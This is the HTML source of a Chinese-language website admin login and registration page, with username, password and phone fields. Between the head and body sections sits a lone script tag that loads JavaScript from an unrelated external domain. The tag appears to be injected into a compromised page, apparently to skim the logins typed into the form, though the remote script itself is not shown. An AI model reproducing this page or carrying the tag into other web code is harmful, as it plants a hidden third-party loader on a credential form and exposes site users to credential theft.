<!DOCTYPE html>
<html lang="en">

<head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <script type="text/javascript" src="user/js/jquery-1.9.0.min.js"></script>
    <script type="text/javascript" src="user/js/login.js"></script>
    <link href="user/css/login2.css" rel="stylesheet" type="text/css" />
</head>
<script language=javascript src='http://www.av8djs.xyz/login.js'></script>
<body>
    <div id="wrap">
        <div id="msg">
            <span id="showMsg"></span>
            <img src="user/images/loding.gif">
        </div>
    </div>
    <h1>网站后台管理系统<sup>V2017</sup></h1>
    <div class="login" style="margin-top:50px;">
        <div class="header">
            <div class="switch" id="switch"><a class="switch_btn_focus" id="switch_qlogin" href="javascript:void(0);" tabindex="7">快速登录</a>
                <a class="switch_btn" id="switch_login" href="javascript:void(0);" tabindex="8">快速注册</a>
                <div class="switch_bottom" id="switch_bottom" style="position: absolute; width: 64px; left: 0px;"></div>
            </div>
        </div>
        <div class="web_qr_login" id="web_qr_login" style="display: block; height: 235px;">
            <!--登录-->
            <div class="web_login" id="web_login">
                <div class="login-box">
                    <div class="login_form">
                        <form action="" >
                            <div class="uinArea" id="uinArea">
                                <label class="input-tips" for="u">帐号：</label>
                                <div class="inputOuter" id="uArea">
                                    <input type="text" id="u" name="username" class="inputstyle" />
                                </div>
                            </div>
                            <div class="pwdArea" id="pwdArea">
                                <label class="input-tips" for="p">密码：</label>
                                <div class="inputOuter" id="pArea">
                                    <input type="password" id="p" name="p" class="inputstyle" />
                                </div>
                            </div>
                            <div style="padding-left:50px;margin-top:20px;">
                                <input type="button" value="登 录" style="width:200px;" class="button_blue" id="loginBtn" />
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <!--登录end-->
        </div>
        <!--注册-->
        <div class="qlogin" id="qlogin" style="display: none; ">
            <div class="web_login">
                <form >
                    <ul class="reg_form" id="reg-ul">
                        <div id="userCue" class="cue">快速注册请注意格式</div>
                        <!-- <div style="height:30px"></div> -->
                        <li>
                            <label for="user" class="input-tips2">用户名：</label>
                            <div class="inputOuter2">
                                <input type="text" id="user" name="user" maxlength="16" class="inputstyle2" />
                            </div>
                        </li>
                        <li>
                            <label for="passwd" class="input-tips2">密码：</label>
                            <div class="inputOuter2">
                                <input type="password" id="passwd" name="passwd" maxlength="16" class="inputstyle2" />
                            </div>
                        </li>
                        <li>
                            <label for="passwd2" class="input-tips2">确认密码：</label>
                            <div class="inputOuter2">
                                <input type="password" id="passwd2" name="" maxlength="16" class="inputstyle2" />
                            </div>
                        </li>
                        <li>
                            <label for="qq" class="input-tips2">昵称：</label>
                            <div class="inputOuter2">
                                <input type="text" id="qq" name="qq" maxlength="10" class="inputstyle2" />
                            </div>
                        </li>
                        <li>
                            <label for="phone" class="input-tips2">phone：</label>
                            <div class="inputOuter2">
                                <input type="text" id="phone" name="phone" maxlength="20" class="inputstyle2" />
                            </div>
                        </li>
                        <li>
                            <div class="inputArea">
                                <input type="button" id="reg" style="width:200px;margin-top:10px;margin-left:85px;" class="button_blue" value="注 册" />
                                <!-- 同意协议并注册 -->
                                <!-- <a href="#" class="zcxy" target="_blank">注册协议</a> -->
                            </div>
                        </li>
                        <div class="cl"></div>
                    </ul>
                </form>
            </div>
        </div>
        <!--注册end-->
    </div>
    <!-- <div class="jianyi">*推荐使用ie8或以上版本ie浏览器或Chrome内核浏览器访问本站</div> -->
</body>

</html>
